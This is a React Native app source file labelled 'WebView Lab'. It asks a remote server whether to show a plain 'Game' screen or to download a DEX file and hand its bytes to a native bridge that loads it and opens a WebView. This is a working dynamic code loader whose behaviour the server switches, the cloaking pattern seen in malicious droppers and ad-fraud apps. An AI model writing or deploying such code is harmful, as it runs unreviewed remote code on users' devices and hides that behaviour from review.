import React, {useEffect, useRef, useState} from 'react';
import {Animated, NativeModules, StyleSheet, Text, View} from 'react-native';

const server = 'https://rn-webview-lab-20261109.oleksandr-teamlead-unitydev.workers.dev';
const testPage = 'https://banda-soft.space/webview/?';

export default function App() {
  const started = useRef(false);
  const [progress, setProgress] = useState<number | null>(null);
  const bar = useRef(new Animated.Value(0)).current;
  useEffect(() => {
    if (progress === null) return;
    const animation = Animated.timing(bar, {
      toValue: progress / 100, duration: 160, useNativeDriver: true,
    });
    animation.start();
    return () => animation.stop();
  }, [bar, progress]);
  const [elapsed, setElapsed] = useState(0);
  const [status, setStatus] = useState('Loading test configuration…');

  useEffect(() => {
    if (started.current) return;
    started.current = true;
    const controller = new AbortController();
    const start = Date.now();
    const clock = setInterval(() => setElapsed(Date.now() - start), 100);
    const timeout = setTimeout(() => controller.abort(), 10000);
    (async () => {
      try {
        const options = {signal: controller.signal};
        const config = await fetch(server + '/getAds?build=smooth-v2', options);
        if (!config.ok) throw Error('Configuration HTTP ' + config.status);
        const {ads, dexUrl} = await config.json();
        if (ads == null || (typeof ads === 'string' && ads.trim() === '')) {
          console.info('WebViewLab empty ads; showing Game');
          setStatus('Game');
          return;
        }
        if (ads !== testPage) {
          setStatus('No permitted page');
          return;
        }
        if (typeof dexUrl !== 'string' || !dexUrl.startsWith(server + '/')) {
          throw Error('Missing or invalid DEX URL');
        }
        console.info('WebViewLab received ads ' + ads);
        console.info('WebViewLab received DEX URL ' + dexUrl);
        setStatus('Downloading DEX');
        setProgress(0);
        const bytes = await new Promise<Uint8Array>((resolve, reject) => {
          const request = new XMLHttpRequest();
          request.open('GET', dexUrl);
          request.responseType = 'arraybuffer';
          request.timeout = 10000;
          request.onprogress = event => {
            if (event.lengthComputable) {
              setProgress(Math.floor(event.loaded * 100 / event.total));
            }
          };
          request.onload = () => {
            if (request.status !== 200) {
              reject(Error('DEX HTTP ' + request.status));
              return;
            }
            setProgress(100);
            resolve(new Uint8Array(request.response));
          };
          request.onerror = () => reject(Error('DEX download failed'));
          request.ontimeout = () => reject(Error('DEX download timed out'));
          request.send();
        });
        console.info('WebViewLab downloaded DEX ' + bytes.length + ' bytes');
        await NativeModules.DexBridge.open(Array.from(bytes), ads);
        setStatus('WebView opened');
      } catch (error) {
        console.warn('WebViewLab ' + String(error));
        setStatus(String(error));
      } finally {
        clearTimeout(timeout);
        clearInterval(clock);
        setElapsed(Date.now() - start);
      }
    })();
  }, []);

  return (
    <View style={styles.screen}>
      {status === 'Game' ? <Text>Game</Text> : (
        <>
          <Text>React Native WebView Lab</Text>
          <Text>{status} · {(elapsed / 1000).toFixed(1)} s</Text>
        </>
      )}
      {progress !== null && (
        <>
          <Text>{progress}% DEX</Text>
          <View style={styles.track}>
            <Animated.View style={[styles.fill, {transform: [{scaleX: bar}]}]} />
          </View>
        </>
      )}
    </View>
  );
}

const styles = StyleSheet.create({
  screen: {flex: 1, alignItems: 'center', justifyContent: 'center', gap: 12},
  track: {width: 220, height: 6, backgroundColor: '#ddd', borderRadius: 3},
  fill: {width: '100%', height: 6, backgroundColor: '#1769db', borderRadius: 3, transformOrigin: 'left center'},
});
